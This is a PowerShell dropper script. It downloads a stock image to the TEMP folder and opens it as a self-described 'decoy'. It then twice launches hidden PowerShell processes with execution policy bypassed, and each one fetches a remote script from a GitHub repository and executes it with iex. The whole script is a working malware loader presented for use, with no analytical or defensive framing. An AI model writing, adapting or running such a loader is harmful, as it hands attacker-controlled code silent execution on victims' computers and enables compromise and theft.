$imageUrl = "https://img.freepik.com/free-photo/abstract-surface-textures-white-concrete-stone-wall_74190-8189.jpg"
$imagePath = "$env:TEMP\blue-bird.jpg"
Invoke-WebRequest -Uri $imageUrl -OutFile $imagePath

# Open the downloaded image (decoy)
if (Test-Path $imagePath) {
    Start-Process $imagePath
} else {
    Write-Host "Image download failed."
}

Start-Sleep 20

Start-Process -FilePath "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -ArgumentList "-w hidden -nop -ep bypass -c `"iex (irm 'https://github.com/bigaersdifmo/test09123/raw/refs/heads/master/single-run.ps1')`"" -WindowStyle Hidden; Start-Sleep 25; Start-Process -FilePath "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -ArgumentList "-w hidden -nop -ep bypass -c `"iex (irm 'https://github.com/bigaersdifmo/test09123/raw/refs/heads/master/single-run.ps1')`"" -WindowStyle Hidden